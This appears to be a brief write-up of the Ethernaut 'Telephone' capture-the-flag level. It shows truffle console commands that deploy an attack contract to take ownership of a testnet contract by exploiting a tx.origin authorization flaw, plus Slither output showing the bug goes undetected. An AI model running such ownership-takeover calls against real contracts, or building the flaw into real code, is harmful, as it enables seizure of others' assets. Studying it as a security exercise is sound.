# Telephone

[Telephone](https://ethernaut.openzeppelin.com/level/0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe)

Contract requires us to generate transaction for which `tx.origin != msg.sender`.

<BR />

## Live Attack
```BASH
truffle console --network goerli
```

```JS
//Identify the account index
// 0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18
accounts
sender = accounts[5]

telephone = await Telephone.at('0x345E615311dee8FF11889FF57ED615Db3905f776')
telephone.owner()
telephone.address

attack = await TelephoneAttack.deployed()
attack.target()
await attack.changeOwner({from: sender})

telephone.owner()
```

<BR />


## Vulnerability Testing Tools

This is a logical bug, so one can expect test tools not to catch it.

<BR />

### Slither

Not Detected

```BASH
slither ./contracts/Telephone.sol  --truffle-ignore-compile --exclude-optimization
```

```
Telephone.changeOwner(address)._owner (contracts/Telephone.sol#12) lacks a zero-check on :
                - owner = _owner (contracts/Telephone.sol#14)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#missing-zero-address-validation

Pragma version^0.8.0 (contracts/Telephone.sol#2) allows old versions
solc-0.8.9 is not recommended for deployment
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity

Parameter Telephone.changeOwner(address)._owner (contracts/Telephone.sol#12) is not in mixedCase
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions
./contracts/Telephone.sol analyzed (1 contracts with 76 detectors), 4 result(s) found
```